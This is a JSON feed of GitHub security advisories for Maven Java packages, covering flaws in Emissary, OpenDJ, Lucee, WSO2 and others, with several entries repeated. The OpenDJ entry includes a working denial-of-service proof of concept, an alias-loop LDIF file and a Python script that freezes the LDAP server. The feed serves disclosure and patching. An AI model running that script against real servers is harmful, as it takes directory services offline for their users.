{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Java artifacts hosted at the Maven central repository",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/maven.json",
    "description": "Security Advisory for Java artifacts hosted at the Maven central repository on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The ChecksumCalculator class within  allows for hashing and checksum generation, but it includes or defaults to algorithms that are no longer recommended for secure cryptographic use cases (e.g., SHA-1, CRC32, and SSDEEP). These algorithms, while possibly valid for certain non-security-critical tasks, can expose users to security risks if used in scenarios where strong cryptographic guarantees are required.</p>\n<h3 id=\"requirement-from-nist\">Requirement from NIST</h3>\n<p>Requirement from NIST regarding SHA1</p>\n<p><a href=\"https://csrc.nist.gov/projects/hash-functions#:~:text=NIST%20deprecated%20the%20use%20of,use%20of%20the%20SHA%2D1\">https://csrc.nist.gov/projects/hash-functions#:~:text=NIST%20deprecated%20the%20use%20of,use%20of%20the%20SHA%2D1</a>.</p>\n<blockquote>\n<p>Federal agencies should use SHA-2 or SHA-3 as an alternative to SHA-1.\nFurther guidance will be available soon. Send questions on the transition to <a href=\"mailto:sha-1-transition@nist.gov\">sha-1-transition@nist.gov</a>.</p>\n</blockquote>\n<p><a href=\"https://www.nist.gov/news-events/news/2022/12/nist-retires-sha-1-cryptographic-algorithm\">https://www.nist.gov/news-events/news/2022/12/nist-retires-sha-1-cryptographic-algorithm</a></p>\n<h3 id=\"mitigation-and-fix\">Mitigation and Fix</h3>\n<p>Make it clear to developers and users that the ChecksumCalculator is specific to the \"Known File Filter\" (KFF) document similarity feature and is not intended to suggest or endorse global use as a cryptographically secure hashing or checksum mechanism.</p>\n<p>While these specific default insecure algorithms can not be updated without violating the intended use-case, it can be clearly documented and prevented using better access modifiers in the ChecksumCalculator class.</p>\n<h3 id=\"details\">Details</h3>\n<p>Within ChecksumCalculator.java, the following points raise potential security concerns:</p>\n<p>SHA-1:\nSHA-1 has been widely deprecated for cryptographic purposes due to known collision attacks.\nThe constructor defaults to \"SHA-1\" if no specific algorithm is provided.\nCRC32:\nCRC32 is a simple checksum mechanism, not a cryptographic hash function. It is unsuitable for security-critical integrity checks since it can be easily manipulated or collided.\nSSDEEP (Fuzzy Hashing):\nSSDEEP is a context-specific tool used for similarity matching and may not be a secure cryptographic function for authentication or tamper detection.\nThere is no apparent mechanism to prevent developers from using these weaker algorithms in security-sensitive contexts. Users of emissary who rely on ChecksumCalculator for strong security guarantees (e.g., data integrity or authentication) may be misled into assuming these algorithms provide adequate protection.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Code could be found <a href=\"https://github.com/NationalSecurityAgency/emissary/blob/main/src/main/java/emissary/kff/ChecksumCalculator.java\">https://github.com/NationalSecurityAgency/emissary/blob/main/src/main/java/emissary/kff/ChecksumCalculator.java</a></p>\n<h3 id=\"impact\">Impact</h3>\n<p>Impact\nWeakened Security Posture: Applications integrating Emissary may inadvertently use these algorithms in a way that could be exploited (e.g., collisions in SHA-1, trivial collisions in CRC32).\nMisleading Assurance: Developers might assume Emissaryâ€™s recommended defaults are secure for cryptographic validation, which can result in insecure implementations.\nPotential for Collision Attacks: Attackers could craft inputs that yield the same SHA-1 hash or manipulate CRC32 sums, thus bypassing naive integrity checks.\nBecause this project is produced under the NSA umbrella, users may have an inflated trust in its security posture, potentially leading them to rely on these algorithms in high-security environments without recognizing the associated risks.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/NationalSecurityAgency/emissary/security/advisories/GHSA-hw43-fcmm-3m5g\">https://github.com/NationalSecurityAgency/emissary/security/advisories/GHSA-hw43-fcmm-3m5g</a></li>\n<li><a href=\"https://github.com/NationalSecurityAgency/emissary/commit/da3a81a8977577597ff2a944820a5ae4e9762368\">https://github.com/NationalSecurityAgency/emissary/commit/da3a81a8977577597ff2a944820a5ae4e9762368</a></li>\n<li><a href=\"https://github.com/NationalSecurityAgency/emissary/releases/tag/8.24.0\">https://github.com/NationalSecurityAgency/emissary/releases/tag/8.24.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hw43-fcmm-3m5g\">https://github.com/advisories/GHSA-hw43-fcmm-3m5g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hw43-fcmm-3m5g",
            "title": "[gov.nsa.emissary:emissary] Emissary May Use a Broken or Risky Cryptographic Algorithm",
            "date_modified": "2025-03-05T22:18:52.000Z",
            "date_published": "2025-03-05T22:18:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hw43-fcmm-3m5g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>This affects the package json-pointer before 0.6.1. Multiple reference of object using slash is supported.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-7709\">https://nvd.nist.gov/vuln/detail/CVE-2020-7709</a></li>\n<li><a href=\"https://github.com/manuelstofer/json-pointer/pull/34\">https://github.com/manuelstofer/json-pointer/pull/34</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JS-JSONPOINTER-596925\">https://snyk.io/vuln/SNYK-JS-JSONPOINTER-596925</a></li>\n<li><a href=\"https://www.npmjs.com/package/json-pointer\">https://www.npmjs.com/package/json-pointer</a></li>\n<li><a href=\"https://github.com/manuelstofer/json-pointer/pull/34/files\">https://github.com/manuelstofer/json-pointer/pull/34/files</a></li>\n<li><a href=\"https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-598862\">https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-598862</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7mg4-w3w5-x5pc\">https://github.com/advisories/GHSA-7mg4-w3w5-x5pc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7mg4-w3w5-x5pc",
            "title": "[org.webjars.npm:json-pointer] Prototype pollution in json-pointer",
            "date_modified": "2025-03-05T19:04:38.000Z",
            "date_published": "2021-05-10T18:37:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7mg4-w3w5-x5pc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A denial-of-service (DoS) vulnerability in OpenDJ has been discovered that causes the server to become unresponsive to all LDAP requests without crashing or restarting. This issue occurs when an alias loop exists in the LDAP database. If an <code>ldapsearch</code> request is executed with alias dereferencing set to \"always\" on this alias entry, the server stops responding to all future requests.\nI have confirmed this issue using the latest OpenDJ version (9.2), both with the official OpenDJ Docker image and a local OpenDJ server running on my Windows 10 machine.</p>\n<h3 id=\"details\">Details</h3>\n<p>An unauthenticated attacker can exploit this vulnerability using a single crafted <code>ldapsearch</code> request. Fortunately, the server can be restarted without data corruption. While this attack requires the existence of an alias loop, I am uncertain whether such loops can be easily created in specific environments or if the method can be adapted to execute other DoS attacks more easily.</p>\n<h3 id=\"poc-steps-to-reproduce\">PoC (Steps to Reproduce)</h3>\n<ol>\n<li>Set up an OpenDJ server instance as usual, using the base DN <code>dc=example,dc=com</code></li>\n<li>Import the attached <code>example_data_alias_dos.ldif</code> file into the LDAP database</li>\n<li>Ensure that the <code>ldap3</code> Python library is installed (<code>pip install ldap3</code>)</li>\n<li>Run the attached Python script <code>python opendj_alias_dos.py</code>, which searches for alias loops and executes the DoS attack</li>\n<li>After executing the script, the server will stop responding to requests until it is restarted</li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability directly affects server availability for everyone using it. A single <code>ldapsearch</code> request on an alias loop entry can cause the entire server to become unresponsive, requiring a restart. The issue can be repeatedly triggered. The following response message is displayed on following requests:</p>\n<pre><code>result: 80 Other (e.g., implementation specific) error\ntext: com.sleepycat.je.EnvironmentFailureException: (JE 18.3.12) JAVA_ERROR: Java Error occurred, recovery may not be possible.\n</code></pre>\n<p><strong>example_data_alias_dos.ldif</strong></p>\n<pre><code>dn: dc=example,dc=com\nobjectClass: top\nobjectClass: domain\ndc: example\n\ndn: ou=people,dc=example,dc=com\nobjectClass: top\nobjectClass: organizationalUnit\nou: people\ndescription: All users\n\ndn: ou=students,ou=people,dc=example,dc=com\nobjectClass: top\nobjectClass: organizationalUnit\nou: students\ndescription: All students\n\ndn: uid=jd123,ou=students,ou=people,dc=example,dc=com\nobjectClass: top\nobjectClass: inetOrgPerson\nobjectClass: organizationalPerson\nobjectClass: person\nmail: jd123@example.com\nsn: Doe\ncn: John Doe\ngivenName: John\nuid: jd123\n\ndn: ou=employees,ou=people,dc=example,dc=com\nobjectClass: top\nobjectClass: organizationalUnit\nou: employees\ndescription: All employees\n\ndn: uid=jd123,ou=employees,ou=people,dc=example,dc=com\nobjectClass: alias\nobjectClass: top\nobjectClass: extensibleObject\naliasedObjectName: uid=jd123,ou=researchers,ou=people,dc=example,dc=com\nuid: jd123\n\ndn: ou=researchers,ou=people,dc=example,dc=com\nobjectClass: top\nobjectClass: organizationalUnit\nou: researchers\ndescription: All reasearchers\n\ndn: uid=jd123,ou=researchers,ou=people,dc=example,dc=com\nobjectClass: alias\nobjectClass: top\nobjectClass: extensibleObject\naliasedObjectName: uid=jd123,ou=employees,ou=people,dc=example,dc=com\nuid: jd123\n</code></pre>\n<p><strong>opendj_alias_dos.py</strong></p>\n<pre><code class=\"language-Python\">import argparse\n\nfrom ldap3 import Server, Connection, ALL, DEREF_NEVER, DEREF_ALWAYS\nfrom ldap3.core.exceptions import LDAPBindError, LDAPSocketOpenError\n\n\ndef connect_to_ldap(ip, port):\n    try:\n        server = Server(ip, port, get_info=ALL)\n        connection = Connection(server, auto_bind=True)\n        return connection\n    except (LDAPBindError, LDAPSocketOpenError) as e:\n        print(f\"Error connecting to LDAP server: {e}\")\n        return None\n\n\ndef find_aliases(connection, base_dn):\n    try:\n        search_filter = \"(objectClass=alias)\"\n        connection.search(base_dn, search_filter=search_filter, dereference_aliases=DEREF_NEVER, attributes=[\"*\"])\n    except Exception as e:\n        print(f\"Error during search: {e}\")\n\n    aliases = {}\n    for entry in connection.entries:\n        entry_dn = entry.entry_dn\n        entry_alias = entry.aliasedObjectName.value\n        aliases[entry_dn] = entry_alias\n\n    return aliases\n\n\ndef detect_alias_loop(aliases):\n    visited = set()\n    path = set()\n\n    def dfs(alias):\n        if alias in path:\n            return alias\n        if alias in visited:\n            return None\n\n        path.add(alias)\n        visited.add(alias)\n\n        aliased_target = aliases.get(alias)\n        if aliased_target:\n            result = dfs(aliased_target)\n            if result:\n                return result\n\n        path.remove(alias)\n        return None\n\n    for alias in aliases:\n        if alias not in visited:\n            loop_alias = dfs(alias)\n            if loop_alias:\n                return loop_alias\n\n    return None\n\n\ndef execute_dos_search(connection, looping_alias_dn):\n    try:\n        search_filter = \"(objectClass=*)\"\n        connection.search(looping_alias_dn, search_filter=search_filter, dereference_aliases=DEREF_ALWAYS)\n    except Exception as e:\n        print(f\"Error during search: {e}\")\n\n    for entry in connection.entries:\n        entry_dn = entry.entry_dn\n        print(entry_dn)\n\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"Search LDAP for circular alias references.\")\n    parser.add_argument(\"ip\", type=str, nargs=\"?\", default=None, help=\"The IP address of the LDAP server.\")\n    parser.add_argument(\"port\", type=int, nargs=\"?\", default=None, help=\"The port of the LDAP server.\")\n    parser.add_argument(\"base\", type=str, nargs=\"?\", default=None, help=\"The base DN of the LDAP server.\")\n    args = parser.parse_args()\n\n    if not args.ip:\n        args.ip = input(\"Please enter the IP address of the LDAP server: \")\n\n    if not args.port:\n        while True:\n            try:\n                port_input = input(\"Please enter the port of the LDAP server: \")\n                args.port = int(port_input)\n                break\n            except ValueError:\n                print(\"Invalid input. Please enter a valid integer for the port.\")\n\n    if not args.base:\n        args.base = input(\"Please enter the base DN of the LDAP server: \")\n\n    connection = connect_to_ldap(args.ip, args.port)\n    if connection:\n        aliases = find_aliases(connection, args.base)\n        looping_alias_dn = detect_alias_loop(aliases)\n        if looping_alias_dn:\n            execute_dos_search(connection, looping_alias_dn)\n            print(f\"DOS executed with alias: {looping_alias_dn}\")\n        else:\n            print(\"No looping alias DN found!\")\n        connection.unbind()\n\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/OpenIdentityPlatform/OpenDJ/security/advisories/GHSA-93qr-h8pr-4593\">https://github.com/OpenIdentityPlatform/OpenDJ/security/advisories/GHSA-93qr-h8pr-4593</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27497\">https://nvd.nist.gov/vuln/detail/CVE-2025-27497</a></li>\n<li><a href=\"https://github.com/OpenIdentityPlatform/OpenDJ/commit/08aee4724608e4a32baa3c7d7499ec913a275aaf\">https://github.com/OpenIdentityPlatform/OpenDJ/commit/08aee4724608e4a32baa3c7d7499ec913a275aaf</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-93qr-h8pr-4593\">https://github.com/advisories/GHSA-93qr-h8pr-4593</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-93qr-h8pr-4593",
            "title": "[org.openidentityplatform.opendj:opendj-server-legacy] OpenDJ Denial of Service (DoS) using alias loop",
            "date_modified": "2025-03-05T18:33:30.000Z",
            "date_published": "2025-03-05T18:33:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-93qr-h8pr-4593"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Lucee team received a responsible disclosure of a security vulnerability which affects all previous releases of Lucee.</p>\n<p>After reviewing the report and confirming the vulnerability, the Lucee team then conducted a further security review and found additional vulnerabilities which have been addressed as part of this this security update.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Lucee 5.4.3.2 and 5.3.12.1 stable releases have been patched with additional hardening</p>\n<p>The older releases, 5.3.7.59., 5.3.8.236 and 5.3.9.173 have also been patched</p>\n<p>Any users running older release, should plan to immediately upgrade to the latest stable release</p>\n<p>6.0 will have a RC as it's not yet released</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/lucee/Lucee/security/advisories/GHSA-vwjx-mmwm-pwrf\">https://github.com/lucee/Lucee/security/advisories/GHSA-vwjx-mmwm-pwrf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-38693\">https://nvd.nist.gov/vuln/detail/CVE-2023-38693</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vwjx-mmwm-pwrf\">https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vwjx-mmwm-pwrf",
            "title": "[org.lucee:lucee] Lucee RCE/XXE Vulnerability",
            "date_modified": "2025-03-05T19:30:32.000Z",
            "date_published": "2025-03-05T18:31:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vwjx-mmwm-pwrf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Lucee team received a responsible disclosure of a security vulnerability which affects all previous releases of Lucee.</p>\n<p>After reviewing the report and confirming the vulnerability, the Lucee team then conducted a further security review and found additional vulnerabilities which have been addressed as part of this this security update.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Lucee 5.4.3.2 and 5.3.12.1 stable releases have been patched with additional hardening</p>\n<p>The older releases, 5.3.7.59., 5.3.8.236 and 5.3.9.173 have also been patched</p>\n<p>Any users running older release, should plan to immediately upgrade to the latest stable release</p>\n<p>6.0 will have a RC as it's not yet released</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/lucee/Lucee/security/advisories/GHSA-vwjx-mmwm-pwrf\">https://github.com/lucee/Lucee/security/advisories/GHSA-vwjx-mmwm-pwrf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-38693\">https://nvd.nist.gov/vuln/detail/CVE-2023-38693</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vwjx-mmwm-pwrf\">https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vwjx-mmwm-pwrf",
            "title": "[org.lucee:lucee] Lucee RCE/XXE Vulnerability",
            "date_modified": "2025-03-05T19:30:32.000Z",
            "date_published": "2025-03-05T18:31:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vwjx-mmwm-pwrf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Lucee team received a responsible disclosure of a security vulnerability which affects all previous releases of Lucee.</p>\n<p>After reviewing the report and confirming the vulnerability, the Lucee team then conducted a further security review and found additional vulnerabilities which have been addressed as part of this this security update.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Lucee 5.4.3.2 and 5.3.12.1 stable releases have been patched with additional hardening</p>\n<p>The older releases, 5.3.7.59., 5.3.8.236 and 5.3.9.173 have also been patched</p>\n<p>Any users running older release, should plan to immediately upgrade to the latest stable release</p>\n<p>6.0 will have a RC as it's not yet released</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/lucee/Lucee/security/advisories/GHSA-vwjx-mmwm-pwrf\">https://github.com/lucee/Lucee/security/advisories/GHSA-vwjx-mmwm-pwrf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-38693\">https://nvd.nist.gov/vuln/detail/CVE-2023-38693</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vwjx-mmwm-pwrf\">https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vwjx-mmwm-pwrf",
            "title": "[org.lucee:lucee] Lucee RCE/XXE Vulnerability",
            "date_modified": "2025-03-05T19:30:32.000Z",
            "date_published": "2025-03-05T18:31:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vwjx-mmwm-pwrf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Lucee team received a responsible disclosure of a security vulnerability which affects all previous releases of Lucee.</p>\n<p>After reviewing the report and confirming the vulnerability, the Lucee team then conducted a further security review and found additional vulnerabilities which have been addressed as part of this this security update.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Lucee 5.4.3.2 and 5.3.12.1 stable releases have been patched with additional hardening</p>\n<p>The older releases, 5.3.7.59., 5.3.8.236 and 5.3.9.173 have also been patched</p>\n<p>Any users running older release, should plan to immediately upgrade to the latest stable release</p>\n<p>6.0 will have a RC as it's not yet released</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/lucee/Lucee/security/advisories/GHSA-vwjx-mmwm-pwrf\">https://github.com/lucee/Lucee/security/advisories/GHSA-vwjx-mmwm-pwrf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-38693\">https://nvd.nist.gov/vuln/detail/CVE-2023-38693</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vwjx-mmwm-pwrf\">https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vwjx-mmwm-pwrf",
            "title": "[org.lucee:lucee] Lucee RCE/XXE Vulnerability",
            "date_modified": "2025-03-05T19:30:32.000Z",
            "date_published": "2025-03-05T18:31:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vwjx-mmwm-pwrf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Lucee team received a responsible disclosure of a security vulnerability which affects all previous releases of Lucee.</p>\n<p>After reviewing the report and confirming the vulnerability, the Lucee team then conducted a further security review and found additional vulnerabilities which have been addressed as part of this this security update.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Lucee 5.4.3.2 and 5.3.12.1 stable releases have been patched with additional hardening</p>\n<p>The older releases, 5.3.7.59., 5.3.8.236 and 5.3.9.173 have also been patched</p>\n<p>Any users running older release, should plan to immediately upgrade to the latest stable release</p>\n<p>6.0 will have a RC as it's not yet released</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/lucee/Lucee/security/advisories/GHSA-vwjx-mmwm-pwrf\">https://github.com/lucee/Lucee/security/advisories/GHSA-vwjx-mmwm-pwrf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-38693\">https://nvd.nist.gov/vuln/detail/CVE-2023-38693</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vwjx-mmwm-pwrf\">https://github.com/advisories/GHSA-vwjx-mmwm-pwrf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vwjx-mmwm-pwrf",
            "title": "[org.lucee:lucee] Lucee RCE/XXE Vulnerability",
            "date_modified": "2025-03-05T19:30:32.000Z",
            "date_published": "2025-03-05T18:31:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vwjx-mmwm-pwrf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A flaw was found in Wildfly Elytron integration. The component does not implement sufficient measures to prevent multiple failed authentication attempts within a short time frame, making it more susceptible to brute force attacks via CLI.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-23368\">https://nvd.nist.gov/vuln/detail/CVE-2025-23368</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2025-23368\">https://access.redhat.com/security/cve/CVE-2025-23368</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2337621\">https://bugzilla.redhat.com/show_bug.cgi?id=2337621</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3jxr-23ph-c89g\">https://github.com/advisories/GHSA-3jxr-23ph-c89g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3jxr-23ph-c89g",
            "title": "[org.wildfly.core:wildfly-elytron-integration] Wildfly Elytron integration susceptible to brute force attacks via CLI",
            "date_modified": "2025-03-04T21:57:27.000Z",
            "date_published": "2025-03-04T18:33:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3jxr-23ph-c89g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Improper Neutralization of Formula Elements in Export CSV feature of Apache Ranger in Apache Ranger Version &lt; 2.6.0.\nUsers are recommended to upgrade to version 2.6.0, which fixes this issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-55532\">https://nvd.nist.gov/vuln/detail/CVE-2024-55532</a></li>\n<li><a href=\"https://cwiki.apache.org/confluence/display/RANGER/Vulnerabilities+found+in+Ranger\">https://cwiki.apache.org/confluence/display/RANGER/Vulnerabilities+found+in+Ranger</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/03/03/2\">http://www.openwall.com/lists/oss-security/2025/03/03/2</a></li>\n<li><a href=\"https://github.com/apache/ranger/commit/8d89fec991f05bd92e28f459bc2b3a3024aaad82\">https://github.com/apache/ranger/commit/8d89fec991f05bd92e28f459bc2b3a3024aaad82</a></li>\n<li><a href=\"https://cwiki.apache.org/confluence/display/RANGER/Apache+Ranger+2.6.0+-+Release+Notes\">https://cwiki.apache.org/confluence/display/RANGER/Apache+Ranger+2.6.0+-+Release+Notes</a></li>\n<li><a href=\"https://issues.apache.org/jira/browse/RANGER-5015\">https://issues.apache.org/jira/browse/RANGER-5015</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2h4w-p9fh-9rmv\">https://github.com/advisories/GHSA-2h4w-p9fh-9rmv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2h4w-p9fh-9rmv",
            "title": "[org.apache.ranger:security-admin-web] Apache Ranger Improper Neutralization of Formula Elements vulnerability",
            "date_modified": "2025-03-03T22:12:12.000Z",
            "date_published": "2025-03-03T18:31:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2h4w-p9fh-9rmv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Improper privilege management in a REST interface allowed registered users to access unauthorized resources if the resource ID was known. </p>\n<p>This issue affects Apache StreamPipes: through 0.95.1.</p>\n<p>Users are recommended to upgrade to version 0.97.0 which fixes the issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-24778\">https://nvd.nist.gov/vuln/detail/CVE-2024-24778</a></li>\n<li><a href=\"https://lists.apache.org/thread/j14w6wghlwwrgfgc6hoz9f94fwxtlgzh\">https://lists.apache.org/thread/j14w6wghlwwrgfgc6hoz9f94fwxtlgzh</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/03/03/1\">http://www.openwall.com/lists/oss-security/2025/03/03/1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vm7w-2724-5m23\">https://github.com/advisories/GHSA-vm7w-2724-5m23</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vm7w-2724-5m23",
            "title": "[org.apache.streampipes:streampipes-parent] Apache StreamPipes has improper privilege management in a REST interface",
            "date_modified": "2025-03-03T20:21:18.000Z",
            "date_published": "2025-03-03T12:30:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vm7w-2724-5m23"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An incorrect authorization vulnerability exists in multiple WSO2 products, allowing protected APIs to be accessed directly using a refresh token instead of the expected access token. Due to improper authorization checks and token mapping, session cookies are not required for API access, potentially enabling unauthorized operations.</p>\n<p>Exploitation requires an attacker to obtain a valid refresh token of an admin user. Since refresh tokens generally have a longer expiration time, this could lead to prolonged unauthorized access to API resources, impacting data confidentiality and integrity.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-2321\">https://nvd.nist.gov/vuln/detail/CVE-2024-2321</a></li>\n<li><a href=\"https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3213\">https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3213</a></li>\n<li><a href=\"https://github.com/wso2/docs-security/blob/76bad9a2f38dc3377af476d0be52c6e775e3d864/en/docs/security-announcements/security-advisories/2024/WSO2-2024-3213.md\">https://github.com/wso2/docs-security/blob/76bad9a2f38dc3377af476d0be52c6e775e3d864/en/docs/security-announcements/security-advisories/2024/WSO2-2024-3213.md</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6qjp-wm6g-m32r\">https://github.com/advisories/GHSA-6qjp-wm6g-m32r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6qjp-wm6g-m32r",
            "title": "[org.wso2.is:identity-server-parent] WSO2 incorrect authorization vulnerability",
            "date_modified": "2025-03-03T19:50:58.000Z",
            "date_published": "2025-02-27T06:30:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6qjp-wm6g-m32r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An incorrect authorization vulnerability exists in multiple WSO2 products, allowing protected APIs to be accessed directly using a refresh token instead of the expected access token. Due to improper authorization checks and token mapping, session cookies are not required for API access, potentially enabling unauthorized operations.</p>\n<p>Exploitation requires an attacker to obtain a valid refresh token of an admin user. Since refresh tokens generally have a longer expiration time, this could lead to prolonged unauthorized access to API resources, impacting data confidentiality and integrity.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-2321\">https://nvd.nist.gov/vuln/detail/CVE-2024-2321</a></li>\n<li><a href=\"https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3213\">https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2024/WSO2-2024-3213</a></li>\n<li><a href=\"https://github.com/wso2/docs-security/blob/76bad9a2f38dc3377af476d0be52c6e775e3d864/en/docs/security-announcements/security-advisories/2024/WSO2-2024-3213.md\">https://github.com/wso2/docs-security/blob/76bad9a2f38dc3377af476d0be52c6e775e3d864/en/docs/security-announcements/security-advisories/2024/WSO2-2024-3213.md</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6qjp-wm6g-m32r\">https://github.com/advisories/GHSA-6qjp-wm6g-m32r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6qjp-wm6g-m32r",
            "title": "[org.wso2.is:identity-server-parent] WSO2 incorrect authorization vulnerability",
            "date_modified": "2025-03-03T19:50:58.000Z",
            "date_published": "2025-02-27T06:30:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6qjp-wm6g-m32r"
            },
            "tags": [
                "severity"
            ]
        },
        {
